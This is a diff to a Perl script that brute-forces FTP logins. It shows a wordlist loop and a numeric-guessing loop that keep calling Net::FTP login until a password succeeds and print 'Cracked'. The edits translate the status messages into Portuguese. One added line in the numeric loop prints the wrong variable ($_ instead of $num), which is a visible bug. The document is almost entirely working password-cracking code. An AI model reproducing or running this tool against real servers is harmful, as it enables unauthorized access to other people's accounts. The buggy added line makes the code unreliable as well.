@@ -47,8 +47,8 @@ if(defined($host) && defined($user)){
     open(WORDLIST, "<", "$wordlist");
 	while(<WORDLIST>){
 	  my $ftp = Net::FTP->new("$host", Debug => 0);
-	  print "[*] Testing: $_\n";
-	  $ftp->login("$user", "$_") or print "[*] Incorrect: $_\n" and next;
+	  print "[*] Testando: $_\n";
+	  $ftp->login("$user", "$_") or print "[*] Incorreto: $_\n" and next;
 	  print "[*] Cracked: $_\n";
 	  last;
 	}
@@ -64,9 +64,9 @@ if(defined($host) && defined($user)){
 	  print "\n[*] Maximo: ";
 	  chomp(my $max = <STDIN>);
 	  for(my $num = 0 x $min; length($num) <= $max; $num++){
-	    print "[*] Testing: $num\n";
+	    print "[*] Testando: $num\n";
 		my $ftp = Net::FTP->new("$host", Debug => 0);
-		$ftp->login($user, $num) or next;
+		$ftp->login($user, $num) or print "[*] Incorreto: $_\n" and next;
 		print "\n[*] Cracked: $num\n";
 		last;
 	  }
